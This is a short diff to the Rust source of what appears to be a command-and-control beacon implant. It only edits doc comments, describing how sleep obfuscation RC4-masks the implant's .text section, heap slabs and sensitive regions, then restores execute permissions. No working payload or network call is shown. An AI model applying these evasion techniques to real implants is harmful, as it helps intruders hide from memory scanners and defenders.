@@ -58,7 +58,7 @@ static MASK_KEY_INIT: AtomicU8 = AtomicU8::new(0);
 /// - config plaintext (1)
 /// - session key (1)
 /// - token cache, BOF output buffers, operator-registered regions (up to ~28)
-/// Total 32 — enough for a fully-loaded beacon with multiple concurrent BOFs.
+///   Total 32 — enough for a fully-loaded beacon with multiple concurrent BOFs.
 const MAX_REGIONS: usize = 32;
 
 /// Registered sensitive regions, each a raw `&'static mut [u8]` pointer + len.
@@ -288,6 +288,12 @@ pub unsafe fn mask_text_and_heap(
 /// Zero callers. Dies alongside `mask_text_and_heap` (see its doc comment).
 /// Will be revived when the Fluctuation sleep-obfuscation chain reintroduces
 /// `.text` masking. Do NOT delete.
+///
+/// # Safety
+/// RC4-rewrites all registered regions, the beacon heap slabs and the
+/// `[text_base, text_base + text_len)` range in place, then flips `.text`
+/// back to RX via `raw`. Same single-beacon-thread preconditions as
+/// [`mask_text_and_heap`].
 #[allow(dead_code)]
 pub unsafe fn unmask_text_and_heap(
     text_base: usize,
